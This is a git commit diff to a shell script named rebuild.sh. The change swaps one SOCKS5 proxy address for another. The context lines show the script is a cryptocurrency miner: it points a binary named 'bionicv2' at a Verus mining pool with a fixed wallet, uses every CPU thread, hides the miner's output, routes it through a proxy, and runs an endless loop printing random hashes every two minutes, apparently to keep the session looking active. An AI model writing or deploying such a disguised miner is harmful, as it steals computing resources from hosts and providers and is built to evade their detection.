2b1042db51b253b281cfaacce0ed17e8bf05c91e
mata lima <lamajuahsu@outlook.com>
2021-10-29 06:46:07 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -9,6 +9,6 @@ pool="stratum+tcp://na.luckpool.net:3956"
 wallet="RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
-proxy="socks5://24.249.199.12:4145"
+proxy="socks5://72.195.114.169:4145"
 ./bionicv2 -a verus -o $pool -u $wallet.$workername -p x -t $thread -x $proxy >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
